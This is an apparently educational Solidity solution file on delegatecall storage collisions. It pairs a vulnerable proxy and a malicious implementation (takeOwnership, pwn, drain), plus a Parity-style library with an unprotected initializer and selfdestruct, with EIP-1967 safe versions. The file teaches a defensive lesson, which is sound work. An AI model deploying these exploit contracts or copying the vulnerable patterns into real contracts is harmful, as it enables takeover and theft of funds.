// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Project 35 Solution: Delegatecall Storage Corruption
 * @notice Complete implementation demonstrating delegatecall vulnerabilities and safe patterns
 */

/**
 * @notice VULNERABLE PROXY - Demonstrates storage collision vulnerability
 *
 * STORAGE LAYOUT:
 * ┌──────────────────────────────────┐
 * │ Slot 0: implementation (address) │ ← Can be overwritten!
 * │ Slot 1: owner (address)          │ ← Can be overwritten!
 * └──────────────────────────────────┘
 *
 * VULNERABILITY:
 * - Implementation contracts write to slots by position
 * - If implementation has variables at slots 0 and 1, it overwrites proxy state
 * - Attacker can become owner and control the proxy
 */
contract VulnerableProxy {
    address public implementation; // slot 0
    address public owner;          // slot 1

    event Upgraded(address indexed implementation);

    constructor(address _implementation) {
        require(_implementation != address(0), "Invalid implementation");
        implementation = _implementation;
        owner = msg.sender;
    }

    /**
     * @notice Upgrade to a new implementation
     * @dev Only owner can upgrade - but owner can be corrupted!
     */
    function upgrade(address _newImplementation) external {
        require(msg.sender == owner, "Not owner");
        require(_newImplementation != address(0), "Invalid implementation");
        implementation = _newImplementation;
        emit Upgraded(_newImplementation);
    }

    /**
     * @notice Fallback function that delegates all calls to implementation
     * @dev Uses delegatecall to execute implementation code in proxy context
     */
    fallback() external payable {
        address impl = implementation;
        require(impl != address(0), "No implementation");

        assembly {
            // Copy calldata to memory
            calldatacopy(0, 0, calldatasize())

            // Delegatecall to implementation
            // delegatecall(gas, address, argsOffset, argsSize, retOffset, retSize)
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)

            // Copy return data
            returndatacopy(0, 0, returndatasize())

            // Return or revert based on result
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }

    receive() external payable {}
}

/**
 * @notice LEGITIMATE IMPLEMENTATION - Works correctly
 *
 * STORAGE LAYOUT:
 * ┌────────────────────────┐
 * │ Slot 0: value (uint256)│
 * │ Slot 1: data (address) │
 * └────────────────────────┘
 *
 * When used via delegatecall:
 * - slot 0 (value) writes to proxy's slot 0 (implementation) ⚠️
 * - slot 1 (data) writes to proxy's slot 1 (owner) ⚠️
 *
 * This is still vulnerable if values are addresses!
 */
contract LegitimateImplementation {
    uint256 public value; // slot 0
    address public data;  // slot 1

    event ValueSet(uint256 value);
    event DataSet(address data);

    function setValue(uint256 _value) external {
        value = _value;
        emit ValueSet(_value);
    }

    function setData(address _data) external {
        data = _data;
        emit DataSet(_data);
    }

    function getValues() external view returns (uint256, address) {
        return (value, data);
    }
}

/**
 * @notice MALICIOUS IMPLEMENTATION - Exploits storage collision
 *
 * STORAGE LAYOUT (intentionally matches proxy):
 * ┌──────────────────────────────────┐
 * │ Slot 0: implementation (address) │ ← Overwrites proxy's implementation!
 * │ Slot 1: owner (address)          │ ← Overwrites proxy's owner!
 * └──────────────────────────────────┘
 *
 * ATTACK MECHANISM:
 * 1. Proxy owner upgrades to this contract (thinking it's safe)
 * 2. Attacker calls takeOwnership() via proxy
 * 3. Code executes in proxy's context
 * 4. owner = msg.sender writes to proxy's slot 1
 * 5. Attacker is now the owner of the proxy!
 * 6. Attacker can upgrade to any implementation
 *
 * REAL WORLD EXAMPLE: Parity Wallet Hack (2017)
 */
contract MaliciousImplementation {
    // These variable names don't matter - only positions!
    address public implementation; // slot 0 - maps to proxy's implementation
    address public owner;          // slot 1 - maps to proxy's owner

    event Pwned(address indexed attacker);

    /**
     * @notice Takes ownership of the proxy
     * @dev When called via proxy's delegatecall, writes to proxy's storage
     */
    function takeOwnership() external {
        // This writes to slot 1 of the PROXY
        owner = msg.sender;
        emit Pwned(msg.sender);
    }

    /**
     * @notice Changes the implementation address in the proxy
     * @dev Allows attacker to upgrade to any contract
     */
    function changeImplementation(address _newImplementation) external {
        // This writes to slot 0 of the PROXY
        implementation = _newImplementation;
    }

    /**
     * @notice Complete takeover in a single transaction
     * @dev Sets both owner and implementation
     */
    function pwn(address _attacker, address _newImplementation) external {
        owner = _attacker;              // Become owner
        implementation = _newImplementation; // Control implementation
        emit Pwned(_attacker);
    }

    /**
     * @notice Drain all ETH from the proxy
     */
    function drain() external {
        // After taking ownership, steal all funds
        payable(owner).transfer(address(this).balance);
    }
}

/**
 * @notice SAFE PROXY - Uses EIP-1967 storage slots
 *
 * STORAGE LAYOUT:
 * Sequential slots (0, 1, 2, ...): Available for implementation
 * Special slots: Used for proxy state
 *
 * Implementation slot:
 * keccak256("eip1967.proxy.implementation") - 1
 * = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
 *
 * Admin slot:
 * keccak256("eip1967.proxy.admin") - 1
 * = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103
 *
 * WHY THIS IS SAFE:
 * - Implementation uses slots 0, 1, 2, ... (sequential)
 * - Proxy uses pseudo-random slots (keccak256 hashes)
 * - Collision probability: ~1 / 2^256 (effectively impossible)
 * - Implementation can't accidentally overwrite proxy state
 */
contract SafeProxy {
    /**
     * @dev Storage slot with the address of the current implementation.
     * This is the keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1.
     */
    bytes32 private constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    /**
     * @dev Storage slot with the admin of the contract.
     * This is the keccak-256 hash of "eip1967.proxy.admin" subtracted by 1.
     */
    bytes32 private constant ADMIN_SLOT =
        0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;

    event Upgraded(address indexed implementation);
    event AdminChanged(address indexed previousAdmin, address indexed newAdmin);

    constructor(address _implementation, address _admin) {
        require(_implementation != address(0), "Invalid implementation");
        require(_admin != address(0), "Invalid admin");
        _setImplementation(_implementation);
        _setAdmin(_admin);
    }

    /**
     * @notice Returns the current implementation address
     */
    function _getImplementation() private view returns (address impl) {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            impl := sload(slot)
        }
    }

    /**
     * @notice Returns the current admin address
     */
    function _getAdmin() private view returns (address admin) {
        bytes32 slot = ADMIN_SLOT;
        assembly {
            admin := sload(slot)
        }
    }

    /**
     * @notice Stores a new implementation address
     */
    function _setImplementation(address _implementation) private {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, _implementation)
        }
    }

    /**
     * @notice Stores a new admin address
     */
    function _setAdmin(address _admin) private {
        bytes32 slot = ADMIN_SLOT;
        assembly {
            sstore(slot, _admin)
        }
    }

    /**
     * @notice Upgrades the implementation
     * @dev Only admin can upgrade
     */
    function upgradeTo(address _newImplementation) external {
        require(msg.sender == _getAdmin(), "Not admin");
        require(_newImplementation != address(0), "Invalid implementation");
        address oldImplementation = _getImplementation();
        _setImplementation(_newImplementation);
        emit Upgraded(_newImplementation);
    }

    /**
     * @notice Changes the admin
     * @dev Only current admin can change admin
     */
    function changeAdmin(address _newAdmin) external {
        require(msg.sender == _getAdmin(), "Not admin");
        require(_newAdmin != address(0), "Invalid admin");
        address oldAdmin = _getAdmin();
        _setAdmin(_newAdmin);
        emit AdminChanged(oldAdmin, _newAdmin);
    }

    /**
     * @notice Returns current implementation (public view)
     */
    function implementation() external view returns (address) {
        return _getImplementation();
    }

    /**
     * @notice Returns current admin (public view)
     */
    function admin() external view returns (address) {
        return _getAdmin();
    }

    /**
     * @notice Fallback function for delegating calls
     */
    fallback() external payable {
        address impl = _getImplementation();
        require(impl != address(0), "No implementation");

        assembly {
            // Copy msg.data to memory
            calldatacopy(0, 0, calldatasize())

            // Delegatecall to implementation
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)

            // Copy return data
            returndatacopy(0, 0, returndatasize())

            // Return or revert
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }

    receive() external payable {}
}

/**
 * @notice Safe implementation for use with SafeProxy
 *
 * STORAGE LAYOUT:
 * ┌────────────────────────────────────────┐
 * │ Slot 0: value (uint256)                │
 * │ Slot 1: balances (mapping location)     │
 * │ Slot 2: initialized (bool)              │
 * │ Slot 3: owner (address)                 │
 * └────────────────────────────────────────┘
 *
 * SAFE because:
 * - These slots (0, 1, 2, 3) are sequential
 * - Proxy uses EIP-1967 slots (pseudo-random)
 * - No collision possible between implementation and proxy
 */
contract SafeImplementation {
    uint256 public value;                          // slot 0
    mapping(address => uint256) public balances;   // slot 1
    bool private initialized;                      // slot 2
    address public owner;                          // slot 3

    event ValueSet(uint256 value);
    event BalanceUpdated(address indexed user, uint256 balance);
    event Initialized(address indexed owner);

    /**
     * @notice Initialize the implementation
     * @dev Used instead of constructor for proxy pattern
     */
    function initialize(address _owner) external {
        require(!initialized, "Already initialized");
        owner = _owner;
        initialized = true;
        emit Initialized(_owner);
    }

    /**
     * @notice Set a value
     */
    function setValue(uint256 _value) external {
        require(msg.sender == owner, "Not owner");
        value = _value;
        emit ValueSet(_value);
    }

    /**
     * @notice Set balance for a user
     */
    function setBalance(address _user, uint256 _balance) external {
        require(msg.sender == owner, "Not owner");
        balances[_user] = _balance;
        emit BalanceUpdated(_user, _balance);
    }

    /**
     * @notice Returns the storage slot for value variable
     */
    function getStorageSlot() external pure returns (uint256) {
        return 0; // value is at slot 0
    }

    /**
     * @notice Returns the storage slot for a specific balance
     * @dev Mapping slot = keccak256(abi.encode(key, position))
     */
    function getBalanceSlot(address user) external pure returns (bytes32) {
        return keccak256(abi.encode(user, uint256(1))); // balances is at slot 1
    }
}

/**
 * @title Storage Inspector
 * @notice Helper contract to calculate and verify storage slots
 */
contract StorageInspector {
    /**
     * @notice Calculate storage slot for a mapping
     * @dev Formula: keccak256(abi.encode(key, position))
     * @param key The mapping key
     * @param position The storage position of the mapping variable
     * @return The storage slot where the value is stored
     */
    function getMappingSlot(address key, uint256 position) external pure returns (bytes32) {
        return keccak256(abi.encode(key, position));
    }

    /**
     * @notice Calculate storage slot for a dynamic array element
     * @dev Formula: keccak256(abi.encode(position)) + index
     * @param position The storage position of the array variable
     * @param index The array index
     * @return The storage slot where the element is stored
     */
    function getArraySlot(uint256 position, uint256 index) external pure returns (bytes32) {
        bytes32 baseSlot = keccak256(abi.encode(position));
        return bytes32(uint256(baseSlot) + index);
    }

    /**
     * @notice Verify EIP-1967 standard storage slots
     * @return implSlot The implementation storage slot
     * @return adminSlot The admin storage slot
     */
    function verifyEIP1967Slots() external pure returns (bytes32 implSlot, bytes32 adminSlot) {
        // Implementation slot
        implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        // Should equal: 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc

        // Admin slot
        adminSlot = bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1);
        // Should equal: 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103
    }

    /**
     * @notice Calculate the beacon slot (EIP-1967)
     * @return beaconSlot The beacon storage slot
     */
    function getBeaconSlot() external pure returns (bytes32 beaconSlot) {
        beaconSlot = bytes32(uint256(keccak256("eip1967.proxy.beacon")) - 1);
        // Should equal: 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50
    }

    /**
     * @notice Demonstrate storage packing
     * @dev Multiple variables < 32 bytes can share a slot
     */
    function demonstrateStoragePacking() external pure returns (
        uint256 slot0,
        uint256 slot1,
        uint256 slot2
    ) {
        // Example storage layout:
        // uint128 a;     // slot 0 (bytes 0-15)
        // uint128 b;     // slot 0 (bytes 16-31) - PACKED!
        // address c;     // slot 1 (bytes 0-19)
        // uint96 d;      // slot 1 (bytes 20-31) - PACKED!
        // uint256 e;     // slot 2 (needs full slot)

        return (0, 1, 2);
    }
}

/**
 * @title Parity Wallet Simulation
 * @notice Simplified simulation of the Parity wallet vulnerability
 */
contract ParityWalletLibrary {
    address public owner;
    mapping(address => bool) public isOwner;

    /**
     * @notice Initialize wallet - VULNERABLE!
     * @dev This should have been protected but wasn't
     */
    function initWallet(address _owner) public {
        // VULNERABILITY: No check if already initialized!
        owner = _owner;
        isOwner[_owner] = true;
    }

    /**
     * @notice Destroy the library - CATASTROPHIC!
     * @dev This was called accidentally, destroying the shared library
     */
    function kill() public {
        require(msg.sender == owner, "Not owner");
        selfdestruct(payable(owner));
    }
}

/**
 * @notice Parity Wallet that uses the library
 * @dev Delegatecalls to library for functionality
 */
contract ParityWallet {
    address public walletLibrary;

    constructor(address _library) {
        walletLibrary = _library;
    }

    /**
     * @notice Fallback delegates to library
     * @dev This is where the vulnerability was exploited
     */
    fallback() external payable {
        address lib = walletLibrary;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), lib, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    receive() external payable {}
}

/**
 * SUMMARY OF VULNERABILITIES:
 *
 * 1. VulnerableProxy + MaliciousImplementation:
 *    - Storage collision allows attacker to overwrite owner
 *    - Complete proxy takeover possible
 *    - Fix: Use EIP-1967 slots
 *
 * 2. Parity Wallet:
 *    - Unprotected initialization function
 *    - Shared library destruction froze funds
 *    - Fix: Proper access control and initialization checks
 *
 * SAFE PATTERNS:
 *
 * 1. SafeProxy:
 *    - Uses EIP-1967 standard slots
 *    - No collision with implementation storage
 *    - Proper access control on upgrade
 *
 * 2. SafeImplementation:
 *    - Works with SafeProxy
 *    - Uses sequential storage safely
 *    - Initialization pattern instead of constructor
 *
 * KEY TAKEAWAYS:
 *
 * 1. Always use EIP-1967 for proxy storage
 * 2. Never use constructors in implementation contracts
 * 3. Protect initialization functions
 * 4. Be extremely careful with delegatecall
 * 5. Use audited libraries (OpenZeppelin) for proxies
 */
